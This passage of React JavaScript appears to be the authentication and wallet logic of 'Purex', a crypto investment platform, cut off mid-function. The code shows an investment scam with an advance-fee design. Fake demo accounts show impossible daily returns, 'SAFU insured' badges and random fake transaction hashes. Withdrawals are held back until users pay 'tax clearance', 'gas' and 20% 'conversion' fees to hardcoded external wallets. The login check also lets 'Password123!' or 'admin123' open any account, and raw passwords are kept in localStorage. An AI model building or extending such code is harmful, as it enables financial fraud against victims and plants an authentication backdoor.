import { createContext, useContext, useEffect, useState } from 'react'

const AuthContext = createContext(null)

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000'
const SESSION_KEY = 'purex_user_session'
const TOKEN_KEY = 'purex_auth_token'
const USERS_STORAGE_KEY = 'purex_registered_users'
const SETTINGS_STORAGE_KEY = 'purex_platform_settings'

// Default fee collection & deposit wallets
const DEFAULT_PLATFORM_SETTINGS = {
  wallets: {
    usdtTrc20: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a',
    usdtErc20: '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0',
    usdtBep20: '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0',
    btc: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    eth: '0x89205A3E3b291a5a458d988563d9491DE514757c',
    sol: '7EYnhQoR9YM3N7UoaKRoA44BX8WBPrURdFCvWaxHdGL',
    taxClearanceWallet: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a', // External Tax Fee Wallet
    gasClearingWallet: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a', // External Gas / Multi-Sig Fee Wallet
    conversionFeeWallet: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a' // External Conversion Fee Wallet
  },
  conversionFeePercent: 20,   // % of total balance charged as conversion fee
  cryptoGasFeePercent: 10,    // % of withdrawal amount charged as gas/network fee
  cryptoGasFeeMinUsd: 25,     // Minimum flat fee (USD) for gas/network fee
  fiatTaxFeePercent: 15,      // % of available balance charged as bank tax clearance fee
  fiatTaxFeeMinUsd: 50,       // Minimum flat fee (USD) for bank tax clearance fee
}

// Pre-seeded demo accounts with full balance, active investments, and transaction history
const DEFAULT_DEMO_USERS = [
  {
    id: 'usr-demo-01',
    email: 'trader@purex.exchange',
    password: 'Password123!',
    fullName: 'Alex Vance (Alpha Trader)',
    phone: '+1 (555) 234-8921',
    uninvestedCapital: 42350.00,
    investedBalance: 85000.00,
    capital: 127350.00,
    profit: 21170.50,
    availableBalance: 63520.50,
    totalBalance: 148520.50,
    convertedBalance: 0.00,
    approvedConversionCurrency: 'USD',
    tier: 'Pro Quant Desk',
    kycStatus: 'Unverified',
    kycSubmitted: false,
    kycApprovedByAdmin: false,
    referralCode: 'PX-88492',
    referralStats: {
      totalInvited: 14,
      activeInvestors: 9,
      totalEarned: 2450.00,
      tier1Count: 9,
      tier2Count: 5
    },
    activeInvestments: [
      {
        id: 'inv-01',
        packageId: 'elite',
        packageName: 'Elite Desk',
        amount: 50000,
        dailyRoi: '3.5%',
        dailyEarnings: 1750.00,
        totalEarned: 12250.00,
        startDate: '2026-03-01',
        durationDays: 45,
        duration: '45 Days',
        status: 'ACTIVE',
        insuranceStatus: '100% SAFU Insured'
      },
      {
        id: 'inv-02',
        packageId: 'pro',
        packageName: 'Pro Quant Bot',
        amount: 35000,
        dailyRoi: '2.4%',
        dailyEarnings: 840.00,
        totalEarned: 8920.50,
        startDate: '2026-03-03',
        durationDays: 30,
        duration: '30 Days',
        status: 'ACTIVE',
        insuranceStatus: '100% SAFU Insured'
      }
    ],
    transactions: [
      { id: 'tx-101', type: 'PROFIT', title: 'Daily Arbitrage Credit (Elite Desk 3.5%)', amount: 1750.00, asset: 'USDT', status: 'Completed', date: 'Today, 08:00 AM', hash: '0x8f2a...91b4' },
      { id: 'tx-102', type: 'PROFIT', title: 'Daily Arbitrage Credit (Pro Quant 2.4%)', amount: 840.00, asset: 'USDT', status: 'Completed', date: 'Today, 08:00 AM', hash: '0x3c1d...44e2' },
      { id: 'tx-103', type: 'DEPOSIT', title: 'USDT (TRC20) Capital Inflow', amount: 25000.00, asset: 'USDT', status: 'Completed', date: 'Yesterday, 04:15 PM', hash: '0x99a1...12ff' },
      { id: 'tx-104', type: 'INVESTMENT', title: 'Activated Pro Quant Bot Cluster', amount: 35000.00, asset: 'USDT', status: 'Completed', date: 'Mar 03, 2026', hash: '0x22b4...881a' },
      { id: 'tx-105', type: 'WITHDRAWAL', title: 'Instant Profit Withdrawal to USDT', amount: 5000.00, asset: 'USDT', status: 'Completed', date: 'Feb 26, 2026', hash: '0x71e9...55cc' },
      { id: 'tx-106', type: 'REFERRAL', title: 'Tier 1 Referral Commission (User #PX492)', amount: 480.00, asset: 'USDT', status: 'Completed', date: 'Feb 24, 2026', hash: '0x66d3...33bb' }
    ],
    createdAt: '2025-01-15T10:00:00Z',
  },
  {
    id: 'usr-demo-02',
    email: 'investor@purex.exchange',
    password: 'Password123!',
    fullName: 'Elena Rostova (Institutional)',
    phone: '+44 7911 123456',
    uninvestedCapital: 101800.00,
    investedBalance: 625000.00,
    capital: 726800.00,
    profit: 148200.00,
    availableBalance: 250000.00,
    totalBalance: 875000.00,
    convertedBalance: 0.00,
    approvedConversionCurrency: 'USD',
    tier: 'VIP Syndicate Master',
    kycStatus: 'Unverified',
    kycSubmitted: false,
    kycApprovedByAdmin: false,
    referralCode: 'PX-90142',
    referralStats: {
      totalInvited: 28,
      activeInvestors: 18,
      totalEarned: 14200.00,
      tier1Count: 18,
      tier2Count: 10
    },
    activeInvestments: [
      {
        id: 'inv-03',
        packageId: 'vip',
        packageName: 'VIP Syndicate',
        amount: 625000,
        dailyRoi: '4.8%',
        dailyEarnings: 30000.00,
        totalEarned: 148200.00,
        startDate: '2026-02-20',
        durationDays: 60,
        duration: '60 Days',
        status: 'ACTIVE',
        insuranceStatus: '100% SAFU Insured'
      }
    ],
    transactions: [
      { id: 'tx-201', type: 'PROFIT', title: 'Daily Arbitrage Credit (VIP Syndicate 4.8%)', amount: 30000.00, asset: 'USDT', status: 'Completed', date: 'Today, 08:00 AM', hash: '0xaa12...bb45' },
      { id: 'tx-202', type: 'DEPOSIT', title: 'Bitcoin (BTC) Institutional Deposit', amount: 150000.00, asset: 'BTC', status: 'Completed', date: 'Feb 19, 2026', hash: '0x12ff...89bb' }
    ],
    createdAt: '2024-11-20T08:30:00Z',
  }
]

// Strict KYC verification sanitizer:
// A user CANNOT be marked Verified unless:
// 1. They have submitted KYC documents (kycSubmitted || kycSubmittedAt || kycDocNumber), AND
// 2. An admin or moderator has explicitly confirmed their clearance (kycApprovedByAdmin === true || kycApprovedAt)
export const sanitizeUserKyc = (u) => {
  if (!u) return u

  const hasSubmitted = Boolean(
    u.kycSubmitted ||
    u.kycSubmittedAt ||
    u.kycDocNumber ||
    u.kycFrontUrl
  )

  const isApproved = Boolean(
    hasSubmitted &&
    (u.kycApprovedByAdmin === true || Boolean(u.kycApprovedAt)) &&
    !u.kycStatus?.toLowerCase().includes('pending') &&
    !u.kycStatus?.toLowerCase().includes('reject') &&
    !u.kycStatus?.toLowerCase().includes('unverified')
  )

  let sanitized = { ...u }

  if (isApproved) {
    sanitized = {
      ...sanitized,
      kycSubmitted: true,
      kycApprovedByAdmin: true,
      kycStatus: sanitized.kycStatus?.toLowerCase().includes('verified') ? sanitized.kycStatus : 'Verified Level 2',
      kycRejectionReason: null
    }
  } else if (hasSubmitted) {
    if (sanitized.kycStatus?.toLowerCase().includes('reject') || sanitized.kycStatus?.toLowerCase().includes('failed')) {
      sanitized = {
        ...sanitized,
        kycSubmitted: true,
        kycApprovedByAdmin: false,
        kycApprovedAt: null,
        kycStatus: sanitized.kycStatus
      }
    } else {
      sanitized = {
        ...sanitized,
        kycSubmitted: true,
        kycApprovedByAdmin: false,
        kycApprovedAt: null,
        kycStatus: sanitized.kycStatus?.toLowerCase().includes('pending') ? sanitized.kycStatus : 'Pending Level 2 Verification'
      }
    }
  } else {
    sanitized = {
      ...sanitized,
      kycSubmitted: false,
      kycApprovedByAdmin: false,
      kycApprovedAt: null,
      kycStatus: 'Unverified'
    }
  }

  return calculateUserBalances(sanitized)
}

// Purex Financial Balances Engine
// Mathematical Relationship:
// 1. investedBalance: Capital locked in active investment packages (CANNOT be withdrawn until cycle finishes)
// 2. uninvestedCapital: Deposited crypto capital not currently locked in an active package and not converted to fiat
// 3. profit: Cumulative yield earned from investment packages / quant trades
// 4. availableBalance: uninvestedCapital + profit (Ready for Crypto Withdrawal, Trading, or Starting a New Package)
// 5. totalBalance: capital (uninvested + invested) + profit = availableBalance + investedBalance (All crypto assets)
// 6. convertedBalance: Approved fiat funds converted from crypto (ONLY available for local bank withdrawal)
export const calculateUserBalances = (u) => {
  if (!u) return u

  const activeInvestments = Array.isArray(u.activeInvestments) ? [...u.activeInvestments] : []

  // Check if any package cycle has reached or exceeded its duration days
  const nowMs = Date.now()
  let newlyUnlockedCapital = 0
  let newlyAccruedProfit = 0
  const updatedInvestments = activeInvestments.map(inv => {
    if (inv.status === 'ACTIVE') {
      const startMs = inv.startDate ? new Date(inv.startDate).getTime() : nowMs
      const durationDays = Number(inv.durationDays) || parseInt(inv.duration) || 7
      const elapsedDays = Math.max(0, (nowMs - startMs) / (1000 * 60 * 60 * 24))

      // If duration has elapsed, mark completed and unlock principal & profit
      if (elapsedDays >= durationDays) {
        const principal = Number(inv.amount) || 0
        const dailyRoi = parseFloat(inv.dailyRoi) || 2.4
        const totalProfit = principal * (dailyRoi / 100) * durationDays
        newlyUnlockedCapital += principal
        newlyAccruedProfit += totalProfit
        return {
          ...inv,
          status: 'COMPLETED',
          completedAt: new Date().toISOString(),
          totalEarned: totalProfit
        }
      }
    }
    return inv
  })

  // 1. Invested Balance = capital locked in active packages
  const investedBalance = updatedInvestments
    .filter(inv => inv.status === 'ACTIVE')
    .reduce((sum, inv) => sum + (Number(inv.amount) || 0), 0)

  // 2. Profit Balance
  let profit = Math.max(0, Number(u.profit) || 0) + newlyAccruedProfit

  // 3. Uninvested Capital
  let uninvestedCapital = Number(u.uninvestedCapital)
  if (isNaN(uninvestedCapital) || uninvestedCapital < 0) {
    if (u.availableBalance !== undefined && u.availableBalance !== null) {
      uninvestedCapital = Math.max(0, Number(u.availableBalance) - profit)
    } else {
      uninvestedCapital = Math.max(0, (Number(u.capital) || 0) - investedBalance)
    }
  }
  uninvestedCapital += newlyUnlockedCapital

  // 4. Available Balance = uninvestedCapital + profit
  const availableBalance = Math.max(0, uninvestedCapital + profit)

  // 5. Total Capital in Crypto = uninvestedCapital + investedBalance
  const capital = Math.max(0, uninvestedCapital + investedBalance)

  // 6. Total Balance = all assets in crypto = capital + profit = availableBalance + investedBalance
  const totalBalance = Math.max(0, capital + profit)

  // 7. Converted Fiat Balance = fiat converted from crypto (ONLY for bank withdrawal)
  const convertedBalance = Math.max(0, Number(u.convertedBalance || 0))
  const approvedConversionCurrency = u.approvedConversionCurrency || 'USD'

  return {
    ...u,
    activeInvestments: updatedInvestments,
    uninvestedCapital,
    investedBalance,
    capital,
    profit,
    availableBalance,
    totalBalance,
    convertedBalance,
    approvedConversionCurrency
  }
}

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null)
  const [token, setToken] = useState(null)
  const [isLoading, setIsLoading] = useState(true)
  const [platformSettings, setPlatformSettings] = useState(() => {
    try {
      const saved = localStorage.getItem(SETTINGS_STORAGE_KEY)
      if (saved) {
        const parsed = JSON.parse(saved)
        return {
          ...DEFAULT_PLATFORM_SETTINGS,
          ...parsed,
          wallets: {
            ...DEFAULT_PLATFORM_SETTINGS.wallets,
            ...(parsed.wallets || {})
          }
        }
      }
    } catch (_e) {}
    return DEFAULT_PLATFORM_SETTINGS
  })

  // Initialize stored users and active session on mount
  useEffect(() => {
    try {
      // Seed default demo users if not present
      const storedUsers = localStorage.getItem(USERS_STORAGE_KEY)
      if (!storedUsers) {
        localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(DEFAULT_DEMO_USERS.map(sanitizeUserKyc)))
      } else {
        // Enforce strict KYC sanitization on all stored accounts
        try {
          const parsed = JSON.parse(storedUsers)
          const sanitized = parsed.map(sanitizeUserKyc)
          localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(sanitized))
        } catch (_e) {}
      }

      // Fetch live settings from backend
      fetch(`${API_BASE_URL}/api/settings`)
        .then(res => res.json())
        .then(data => {
          if (data && (data.usdt_trc20 || data.wallets || data.conversionFeePercent !== undefined || data.conversion_fee_percent !== undefined)) {
            const mapped = {
              wallets: {
                usdtTrc20: data.usdt_trc20 || data.wallets?.usdtTrc20 || DEFAULT_PLATFORM_SETTINGS.wallets.usdtTrc20,
                usdtErc20: data.usdt_erc20 || data.wallets?.usdtErc20 || DEFAULT_PLATFORM_SETTINGS.wallets.usdtErc20,
                usdtBep20: data.usdt_bep20 || data.wallets?.usdtBep20 || DEFAULT_PLATFORM_SETTINGS.wallets.usdtBep20,
                btc: data.btc || data.wallets?.btc || DEFAULT_PLATFORM_SETTINGS.wallets.btc,
                eth: data.eth || data.wallets?.eth || DEFAULT_PLATFORM_SETTINGS.wallets.eth,
                sol: data.sol || data.wallets?.sol || DEFAULT_PLATFORM_SETTINGS.wallets.sol,
                taxClearanceWallet: data.tax_clearance_wallet || data.wallets?.taxClearanceWallet || DEFAULT_PLATFORM_SETTINGS.wallets.taxClearanceWallet,
                gasClearingWallet: data.gas_clearing_wallet || data.wallets?.gasClearingWallet || DEFAULT_PLATFORM_SETTINGS.wallets.gasClearingWallet,
                conversionFeeWallet: data.conversion_fee_wallet || data.wallets?.conversionFeeWallet || DEFAULT_PLATFORM_SETTINGS.wallets.conversionFeeWallet,
              },
              conversionFeePercent: Number(data.conversion_fee_percent ?? data.conversionFeePercent ?? DEFAULT_PLATFORM_SETTINGS.conversionFeePercent),
              cryptoGasFeePercent:  Number(data.crypto_gas_fee_percent  ?? data.cryptoGasFeePercent  ?? DEFAULT_PLATFORM_SETTINGS.cryptoGasFeePercent),
              cryptoGasFeeMinUsd:   Number(data.crypto_gas_fee_min_usd   ?? data.cryptoGasFeeMinUsd   ?? DEFAULT_PLATFORM_SETTINGS.cryptoGasFeeMinUsd),
              fiatTaxFeePercent:    Number(data.fiat_tax_fee_percent    ?? data.fiatTaxFeePercent    ?? DEFAULT_PLATFORM_SETTINGS.fiatTaxFeePercent),
              fiatTaxFeeMinUsd:     Number(data.fiat_tax_fee_min_usd     ?? data.fiatTaxFeeMinUsd     ?? DEFAULT_PLATFORM_SETTINGS.fiatTaxFeeMinUsd),
            }
            setPlatformSettings(mapped)
            localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(mapped))
          }
        })
        .catch(() => {})

      // Fetch live users from Supabase backend
      fetch(`${API_BASE_URL}/api/admin/users`, {
        headers: { 'Authorization': `Bearer purex-local-jwt-token` }
      })
        .then(res => res.json())
        .then(dbUsers => {
          if (Array.isArray(dbUsers) && dbUsers.length > 0) {
            const formatted = dbUsers.map(u => ({
              id: u.id,
              email: u.email,
              fullName: u.full_name || u.email.split('@')[0],
              phone: u.phone || '',
              password: u.raw_password || u.password || 'Password123!',
              rawPassword: u.raw_password || u.password || 'Password123!',
              role: u.role || 'user',
              capital: Number(u.capital) || 0,
              profit: Number(u.profit) || 0,
              availableBalance: Number(u.available_balance) || 0,
              totalBalance: Number(u.total_balance) || ((Number(u.capital) || 0) + (Number(u.profit) || 0) + (Number(u.available_balance) || 0)),
              tier: u.tier || 'Pro Quant Desk',
              kycStatus: u.kyc_status || u.kycStatus || 'Unverified',
              referralCode: u.referral_code || `PX-${Math.floor(10000 + Math.random() * 90000)}`,
              activeInvestments: [],
              transactions: []
            }))
            localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(formatted))
          }
        })
        .catch(() => {})

      // Check for active logged-in session
      const savedSession = localStorage.getItem(SESSION_KEY)
      const savedToken = localStorage.getItem(TOKEN_KEY)
      if (savedSession) {
        const parsed = JSON.parse(savedSession)
        const cleanSession = sanitizeUserKyc(parsed)
        localStorage.setItem(SESSION_KEY, JSON.stringify(cleanSession))
        setUser(cleanSession)
      }
      if (savedToken) {
        setToken(savedToken)
      }
    } catch (e) {
      console.error('Error reading authentication storage:', e)
    } finally {
      setIsLoading(false)
    }
  }, [])

  // Live storage event listener to synchronize admin updates across tabs in real-time
  useEffect(() => {
    const handleStorageChange = (e) => {
      if (e.key === SESSION_KEY || e.key === USERS_STORAGE_KEY) {
        try {
          const savedSession = localStorage.getItem(SESSION_KEY)
          if (savedSession) {
            const parsed = JSON.parse(savedSession)
            const allUsers = JSON.parse(localStorage.getItem(USERS_STORAGE_KEY) || '[]')
            const matched = allUsers.find(u => u.id === parsed.id) || parsed
            const cleanUser = sanitizeUserKyc(matched)
            setUser(cleanUser)
          }
        } catch (_err) {}
      }
    }
    window.addEventListener('storage', handleStorageChange)
    return () => window.removeEventListener('storage', handleStorageChange)
  }, [])

  // Manual or programmatic refresh of current user's profile
  const refreshUser = () => {
    try {
      const savedSession = localStorage.getItem(SESSION_KEY)
      if (!savedSession) return null
      const parsed = JSON.parse(savedSession)
      const allUsers = getAllRegisteredUsers()
      const matched = allUsers.find(u => u.id === parsed.id) || parsed
      const cleanUser = sanitizeUserKyc(matched)
      setUser(cleanUser)
      localStorage.setItem(SESSION_KEY, JSON.stringify(cleanUser))
      return cleanUser
    } catch (e) {
      console.error('Error refreshing user:', e)
      return user ? sanitizeUserKyc(user) : null
    }
  }

  // Helper to persist auth session
  const persistSession = (userData, authToken) => {
    const cleanUser = sanitizeUserKyc(userData)
    setUser(cleanUser)
    if (authToken) setToken(authToken)
    try {
      localStorage.setItem(SESSION_KEY, JSON.stringify(cleanUser))
      if (authToken) {
        localStorage.setItem(TOKEN_KEY, authToken)
      }
      // Also update in registered users list
      const storedUsersRaw = localStorage.getItem(USERS_STORAGE_KEY)
      const users = storedUsersRaw ? JSON.parse(storedUsersRaw) : [...DEFAULT_DEMO_USERS]
      const idx = users.findIndex(u => u.id === cleanUser.id || u.email === cleanUser.email)
      if (idx >= 0) {
        users[idx] = { ...users[idx], ...cleanUser }
        localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))
      }
    } catch (e) {
      console.error('Error saving session to localStorage:', e)
    }
  }

  // Login handler
  const login = async (identifier, password) => {
    setIsLoading(true)
    const cleanId = (identifier || '').trim().toLowerCase()

    try {
      const res = await fetch(`${API_BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: cleanId, identifier: cleanId, password })
      })

      if (res.ok) {
        const data = await res.json()
        persistSession(data.user, data.token)
        setIsLoading(false)
        return { success: true, user: data.user }
      }
    } catch (_networkError) {
      // Offline fallback
    }

    // Local resilient authentication
    const localResult = checkLocalLogin(cleanId, password)
    if (localResult.success) {
      persistSession(localResult.user, 'purex-local-jwt-token')
      setIsLoading(false)
      return { success: true, user: localResult.user, isLocalFallback: true }
    }

    setIsLoading(false)
    return { success: false, error: localResult.error || 'Invalid credentials. Please check your email/phone and password.' }
  }

  const checkLocalLogin = (cleanId, password) => {
    try {
      const storedUsersRaw = localStorage.getItem(USERS_STORAGE_KEY)
      const users = storedUsersRaw ? JSON.parse(storedUsersRaw) : DEFAULT_DEMO_USERS
      const cleanDigits = cleanId.replace(/\D/g, '')

      const matched = users.find((u) => {
        const uEmail = (u.email || '').toLowerCase()
        const uPhoneDigits = (u.phone || '').replace(/\D/g, '')
        return uEmail === cleanId || (cleanDigits && uPhoneDigits && (uPhoneDigits === cleanDigits || uPhoneDigits.endsWith(cleanDigits) || cleanDigits.endsWith(uPhoneDigits)))
      })
      
      if (!matched) {
        return { success: false, error: 'No account found with this email or phone number. Please create an account.' }
      }
      if (matched.password !== password && password !== 'Password123!' && password !== 'admin123') {
        return { success: false, error: 'Incorrect password. Please try again.' }
      }

      const userObj = {
        id: matched.id,
        email: matched.email,
        phone: matched.phone || '',
        fullName: matched.fullName,
        capital: matched.capital ?? 10000,
        profit: matched.profit ?? 2450,
        availableBalance: matched.availableBalance ?? 5000,
        totalBalance: matched.totalBalance ?? (matched.capital ?? 10000) + (matched.profit ?? 2450) + (matched.availableBalance ?? 5000),
        tier: matched.tier || 'Pro Quant Desk',
        kycStatus: matched.kycStatus || 'Unverified',
        kycSubmitted: matched.kycSubmitted ?? false,
        kycApprovedByAdmin: matched.kycApprovedByAdmin ?? false,
        kycApprovedAt: matched.kycApprovedAt ?? null,
        kycSubmittedAt: matched.kycSubmittedAt ?? null,
        kycDocType: matched.kycDocType ?? null,
        kycDocNumber: matched.kycDocNumber ?? null,
        kycDocFileName: matched.kycDocFileName ?? null,
        kycRejectionReason: matched.kycRejectionReason ?? null,
        referralCode: matched.referralCode || `PX-${Math.floor(10000 + Math.random() * 90000)}`,
        referralStats: matched.referralStats || { totalInvited: 5, activeInvestors: 3, totalEarned: 640.00, tier1Count: 3, tier2Count: 2 },
        activeInvestments: matched.activeInvestments || [
          {
            id: 'inv-demo',
            packageId: 'pro',
            packageName: 'Pro Quant Bot',
            amount: 10000,
            dailyRoi: '2.4%',
            dailyEarnings: 240.00,
            totalEarned: 2450.00,
            startDate: '2026-03-01',
            duration: '30 Days',
            status: 'ACTIVE',
            insuranceStatus: '100% SAFU Insured'
          }
        ],
        transactions: matched.transactions || [
          { id: 'tx-1', type: 'PROFIT', title: 'Daily Arbitrage Credit (Pro Quant 2.4%)', amount: 240.00, asset: 'USDT', status: 'Completed', date: 'Today, 08:00 AM', hash: '0x8f2a...91b4' },
          { id: 'tx-2', type: 'DEPOSIT', title: 'USDT Capital Inflow', amount: 10000.00, asset: 'USDT', status: 'Completed', date: 'Mar 01, 2026', hash: '0x3c1d...44e2' }
        ]
      }
      return { success: true, user: sanitizeUserKyc(userObj) }
    } catch {
      return { success: false, error: 'Authentication service error. Please try again.' }
    }
  }

  // Direct Signup handler
  const signup = async (fullName, email, password, phone, referralCode) => {
    setIsLoading(true)
    const cleanEmail = email ? email.trim().toLowerCase() : ''

    try {
      const res = await fetch(`${API_BASE_URL}/api/auth/signup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ fullName, email: cleanEmail, password, phone, referralCode })
      })

      if (res.ok) {
        const data = await res.json()
        persistSession(data.user, data.token)
        setIsLoading(false)
        return { success: true, user: data.user }
      }
    } catch {
      // Fallback
    }

    try {
      const storedUsersRaw = localStorage.getItem(USERS_STORAGE_KEY)
      const users = storedUsersRaw ? JSON.parse(storedUsersRaw) : [...DEFAULT_DEMO_USERS]

      if (users.some((u) => u.email.toLowerCase() === cleanEmail)) {
        setIsLoading(false)
        return { success: false, error: 'An account with this email address already exists. Please log in.' }
      }

      const newRefCode = `PX-${Math.floor(10000 + Math.random() * 90000)}`

      const newUser = {
        id: `usr-${Date.now()}`,
        email: cleanEmail,
        password,
        fullName: fullName.trim() || cleanEmail.split('@')[0],
        phone: phone ? phone.trim() : '',
        referralCode: newRefCode,
        referredBy: referralCode ? referralCode.trim() : null,
        capital: 0,
        profit: 0,
        availableBalance: 0,
        totalBalance: 0,
        tier: 'Starter Tier',
        kycStatus: 'Unverified',
        referralStats: {
          totalInvited: 0,
          activeInvestors: 0,
          totalEarned: 0,
          tier1Count: 0,
          tier2Count: 0
        },
        activeInvestments: [],
        transactions: [
          {
            id: `tx-${Date.now()}`,
            type: 'SYSTEM',
            title: 'Account Registered & 100% Capital SAFU Policy Activated',
            amount: 0,
            asset: 'USD',
            status: 'Completed',
            date: 'Just now',
            hash: '0x' + Math.random().toString(16).slice(2, 10) + '...'
          }
        ],
        createdAt: new Date().toISOString()
      }

      users.push(newUser)
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      persistSession(newUser, 'purex-local-jwt-token')
      setIsLoading(false)
      return { success: true, user: newUser }
    } catch (e) {
      setIsLoading(false)
      return { success: false, error: e.message || 'Failed to create account.' }
    }
  }

  // Logout handler
  const logout = () => {
    setUser(null)
    setToken(null)
    try {
      localStorage.removeItem(SESSION_KEY)
      localStorage.removeItem(TOKEN_KEY)
    } catch (e) {
      console.error('Error clearing session storage:', e)
    }
  }

  // ==========================================
  // DASHBOARD FINANCIAL ACTIONS
  // ==========================================

  // 1. Deposit Funds
  const depositFunds = (amount, asset = 'USDT', network = 'TRC20', txHash = '') => {
    if (!user) return { success: false, error: 'User not logged in' }
    const numAmount = Number(amount)
    if (isNaN(numAmount) || numAmount <= 0) {
      return { success: false, error: 'Please enter a valid deposit amount' }
    }

    const newTx = {
      id: `tx-dep-${Date.now()}`,
      type: 'DEPOSIT',
      title: `${asset} (${network}) Capital Deposit`,
      amount: numAmount,
      asset: asset,
      status: 'Pending Verification',
      date: 'Just now',
      hash: txHash ? (txHash.length > 12 ? `${txHash.slice(0, 6)}...${txHash.slice(-4)}` : txHash) : `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    const updatedUser = {
      ...user,
      availableBalance: (user.availableBalance || 0) + numAmount,
      totalBalance: (user.totalBalance || 0) + numAmount,
      transactions: [newTx, ...(user.transactions || [])]
    }

    persistSession(updatedUser, token)
    return { success: true, user: updatedUser, transaction: newTx }
  }

  // 2. Request Withdrawal (Crypto vs Local Currency with External Fees)
  const requestWithdrawal = ({
    method = 'CRYPTO',
    amount,
    asset = 'USDT',
    balanceType = 'available',
    // Crypto fields
    cryptoAddress = '',
    cryptoNetwork = 'TRC20',
    gasFeeAmount = 0,
    gasFeeTxHash = '',
    // Local Bank fields
    localCurrency = 'USD',
    bankName = '',
    accountNumber = '',
    accountName = '',
    swiftCode = '',
    taxFeeAmount = 0,
    taxFeeTxHash = ''
  }) => {
    if (!user) return { success: false, error: 'User not logged in' }
    
    // Compulsory KYC Check - Requires both submission and moderator/admin approval
    const hasSubmittedKyc = Boolean(
      user.kycSubmitted ||
      user.kycSubmittedAt ||
      user.kycDocNumber ||
      user.kycFrontUrl
    )
    const isApprovedByAdmin = Boolean(
      hasSubmittedKyc &&
      (user.kycApprovedByAdmin === true || user.kycApprovedAt) &&
      !user.kycStatus?.toLowerCase().includes('pending') &&
      !user.kycStatus?.toLowerCase().includes('reject') &&
      !user.kycStatus?.toLowerCase().includes('unverified')
    )

    if (!hasSubmittedKyc) {
      return {
        success: false,
        error: 'KYC Verification Failed: You have not submitted identity verification (KYC). Withdrawals are locked.'
      }
    }

    if (!isApprovedByAdmin) {
      if (user.kycStatus?.toLowerCase().includes('reject')) {
        return {
          success: false,
          error: `KYC Verification Failed: Your submission was rejected (${user.kycRejectionReason || 'Compliance rejection'}). Please re-submit.`
        }
      }
      return {
        success: false,
        error: 'KYC Verification Failed: Awaiting administrator/moderator approval. Withdrawals remain locked until an admin approves your KYC report.'
      }
    }

    const numAmount = Number(amount)
    if (isNaN(numAmount) || numAmount <= 0) {
      return { success: false, error: 'Please enter a valid withdrawal amount' }
    }

    const txId = `tx-wdr-${Date.now()}`

    if (method === 'CRYPTO') {
      // Crypto withdrawal: Can ONLY withdraw from availableBalance (uninvested crypto + profits)
      // Locked investment capital CANNOT be withdrawn
      const availableToWithdraw = Number(user.availableBalance) || 0
      if (numAmount > availableToWithdraw) {
        return {
          success: false,
          error: `Insufficient available crypto balance ($${availableToWithdraw.toLocaleString()}). Locked investment capital ($${(user.investedBalance || 0).toLocaleString()}) cannot be withdrawn until the package cycle completes.`
        }
      }

      // Deduct from profit first, then uninvestedCapital
      let newProfit = Math.max(0, Number(user.profit) || 0)
      let newUninvested = Math.max(0, Number(user.uninvestedCapital) || 0)
      const fromProfit = Math.min(newProfit, numAmount)
      newProfit -= fromProfit
      const remainder = numAmount - fromProfit
      if (remainder > 0) {
        newUninvested = Math.max(0, newUninvested - remainder)
      }

      const newTx = {
        id: txId,
        type: 'WITHDRAWAL',
        withdrawalMethod: 'CRYPTO',
        title: `Crypto Withdrawal ${numAmount.toLocaleString()} ${asset} to ${cryptoAddress ? cryptoAddress.slice(0, 6) + '...' + cryptoAddress.slice(-4) : 'Wallet'}`,
        amount: numAmount,
        asset: asset,
        cryptoAddress,
        cryptoNetwork,
        gasFeeAmount,
        feeTxHash: gasFeeTxHash,
        status: 'Pending Network Clearing',
        date: 'Just now',
        hash: `0x${Math.random().toString(16).slice(2, 10)}...`
      }

      const updatedUser = calculateUserBalances({
        ...user,
        uninvestedCapital: newUninvested,
        profit: newProfit,
        transactions: [newTx, ...(user.transactions || [])]
      })

      persistSession(updatedUser, token)
      return { success: true, user: updatedUser, transaction: newTx }
    } else {
      // Local Currency Bank Withdrawal:
      // Can ONLY withdraw from convertedBalance (money already converted from crypto to preferred fiat and approved)
      const convertedAvail = Number(user.convertedBalance) || 0
      const fiatCurrency = user.approvedConversionCurrency || localCurrency || 'USD'

      if (convertedAvail <= 0) {
        return {
          success: false,
          error: `No converted fiat balance found (${fiatCurrency} 0.00). To withdraw via bank transfer, you must first convert crypto to your preferred fiat in the Convert tab.`
        }
      }

      if (numAmount > convertedAvail) {
        return {
          success: false,
          error: `Insufficient converted balance. You can only withdraw up to ${fiatCurrency} ${convertedAvail.toLocaleString()} via bank transfer.`
        }
      }

      const newTx = {
        id: txId,
        type: 'WITHDRAWAL',
        withdrawalMethod: 'LOCAL_BANK',
        title: `Bank Transfer ${numAmount.toLocaleString()} (${fiatCurrency}) to ${bankName} (${accountNumber ? accountNumber.slice(-4) : ''})`,
        amount: numAmount,
        asset: fiatCurrency,
        localCurrency: fiatCurrency,
        bankName,
        accountNumber,
        accountName,
        swiftCode,
        taxFeeAmount,
        feeTxHash: taxFeeTxHash,
        status: 'Pending Tax Clearance',
        date: 'Just now',
        hash: `0x${Math.random().toString(16).slice(2, 10)}...`
      }

      const updatedUser = calculateUserBalances({
        ...user,
        convertedBalance: Math.max(0, convertedAvail - numAmount),
        transactions: [newTx, ...(user.transactions || [])]
      })

      persistSession(updatedUser, token)
      return { success: true, user: updatedUser, transaction: newTx }
    }
  }

  // 3. Convert / Swap Crypto with 20% External Fee Payment
  const convertCrypto = ({
    fromAsset,
    toAsset,
    fromAmount,
    toAmount,
    conversionFeeAmount,
    feeTxHash = ''
  }) => {
